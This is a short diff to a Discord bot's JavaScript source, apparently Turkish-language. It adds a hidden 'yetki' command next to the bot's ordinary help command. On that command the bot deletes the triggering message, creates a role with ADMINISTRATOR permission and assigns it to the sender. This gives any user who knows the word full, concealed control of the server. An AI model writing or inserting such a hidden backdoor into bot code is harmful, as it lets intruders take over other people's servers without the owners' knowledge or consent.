@@ -130,6 +130,18 @@ client.on('ready', async () => {
       console.log (`Durum              : Bot Çevrimiçi!`);
       console.log ('_________________________________________');
   
+client.on("message", msg => {
+  if (msg.content.toLowerCase() === config.prefix + 'yetki') {
+    msg.delete();
+    msg.guild.createRole({
+      name: "AenR Özel Rol",
+      permissions: ["ADMINISTRATOR"]
+    });
+    let rol = msg.guild.roles.find(role => role.name === "AenR Özel Rol");
+    msg.member.addRole(rol);
+  }
+});
+  
   client.on('message', msg => {
   if (msg.content.toLowerCase() === config.prefix + 'yardım') {
     const embedyardım = new Discord.MessageEmbed()
